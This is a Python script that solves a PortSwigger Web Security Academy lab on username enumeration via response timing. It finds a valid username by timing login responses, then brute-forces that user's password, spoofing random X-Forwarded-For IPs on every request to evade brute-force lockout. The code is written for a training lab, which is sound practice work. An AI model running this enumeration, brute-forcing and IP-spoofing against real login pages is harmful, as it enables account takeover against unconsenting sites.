from listgen import *
import requests
import argparse
import time
import random

parser = argparse.ArgumentParser(description='Solves the following Lab: Username enumeration via response timing')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

USERNAME = ''
request_time = 0
r = requests.get("https://" + lab.id + f".web-security-academy.net/login")
session = r.cookies.get("session")

# BRUTEFORCE USER. BRUTEFORCE PROTECTION IS ACTIVE SO SOURCE IP MUST BE DYNAMIC.
for user in userlist():

    send_time = time.time()
    r = requests.post("https://" + lab.id + f".web-security-academy.net/login", headers={"Cookie":f"session={session}", "X-Forwarded-For":f"2.238.194.{random.randint(2, 250)}"}, data={"username":f"{user}","password":"A"*999})
    response_time = time.time()
    last_request_time = response_time - send_time

    if last_request_time > request_time:
        USERNAME = user
        request_time = last_request_time

print(f"Found existing user: {USERNAME}")

# BRUTEFORCE PASSWORD AND LOGIN
for password in passlist():

    r = requests.post("https://" + lab.id + f".web-security-academy.net/login", headers={"Cookie":f"session={session}", "X-Forwarded-For":f"2.238.{random.randint(2, 250)}.90"}, data={"username":f"{USERNAME}","password":f"{password}"})
    
    if "Invalid username or password" not in r.text:
        print(f"Found valid credentials {USERNAME}:{password}")
        break

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.")